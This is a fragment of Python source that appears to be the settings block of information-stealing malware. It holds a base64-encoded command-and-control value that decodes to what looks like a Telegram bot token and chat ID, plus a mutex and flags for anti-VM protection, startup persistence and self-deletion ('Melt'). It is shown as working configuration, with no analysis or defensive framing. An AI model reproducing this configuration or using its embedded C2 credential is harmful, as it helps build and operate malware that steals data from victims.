...
class Settings:
    C2 = (1, base64.b64decode('ODQxNTg3MjU4NzpBQUVqRjAtazlPU2loNzZoMDNLZFJRclc5NjdkemRyblUxNCQ1NjMxMzI0NTM2').decode())
    Mutex = base64.b64decode('VGZKOEhyR2l3d1J6REV5ag==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
